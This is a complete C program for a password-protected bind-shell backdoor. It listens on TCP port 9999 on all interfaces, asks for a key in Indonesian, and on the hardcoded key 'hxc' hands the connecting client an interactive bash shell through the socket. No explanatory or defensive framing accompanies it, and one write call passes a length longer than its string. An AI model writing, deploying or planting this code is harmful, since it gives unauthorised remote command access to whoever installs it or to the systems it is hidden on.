#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

#define PORT 9999
#define SECRET "hxc"

void handle_client(int client_sock) {
    char buffer[1024];
    write(client_sock, "Masukkan key: ", 23);
    
    int len = read(client_sock, buffer, sizeof(buffer) - 1);
    buffer[len] = '\0';

    if (strncmp(buffer, SECRET, strlen(SECRET)) == 0) {
        write(client_sock, "Akses diterima. Masuk shell...\n", 32);
        dup2(client_sock, 0);
        dup2(client_sock, 1);
        dup2(client_sock, 2);
        execl("/bin/bash", "bash", "-i", NULL);
    } else {
        write(client_sock, "Key salah. Bye.\n", 16);
        close(client_sock);
    }
}

int main() {
    int sockfd, client_sock;
    struct sockaddr_in server, client;
    socklen_t client_len = sizeof(client);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }

    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Bind error");
        exit(1);
    }

    listen(sockfd, 5);
    printf("[*] Listening on port %d...\n", PORT);

    while (1) {
        client_sock = accept(sockfd, (struct sockaddr *)&client, &client_len);
        if (client_sock < 0) {
            perror("Accept error");
            continue;
        }

        if (!fork()) {
            close(sockfd);
            handle_client(client_sock);
            exit(0);
        }
        close(client_sock);
    }

    return 0;
}
